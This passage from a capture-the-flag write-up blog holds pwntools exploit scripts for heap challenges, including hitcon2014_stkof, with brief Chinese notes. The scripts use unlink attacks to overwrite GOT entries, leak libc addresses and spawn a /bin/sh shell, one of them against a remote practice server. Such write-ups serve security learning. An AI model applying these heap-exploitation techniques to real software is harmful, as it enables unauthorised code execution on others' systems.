class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line">chunk = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(system)+p64(system)+p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="hitcon2014-stkof"><a class="header-anchor" href="#hitcon2014-stkof">¶</a>hitcon2014_stkof</h3>
-<h4 id="题目分析"><a class="header-anchor" href="#题目分析">¶</a>题目分析</h4>
-<p>本题和上一题区别不大，唯一的区别就在于本题没有调用system函数，需要泄露libc地址</p>
-<p>即把free_got 改为 puts_plt即可泄露地址</p>
-<h4 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;stkof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;stkof&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26259</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">chunk = <span class="number">0x602150</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload =  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(atoi_got)+p64(atoi_got)+p64(free_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(puts_plt)),p64(puts_plt))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(system)),p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>pwn</category>
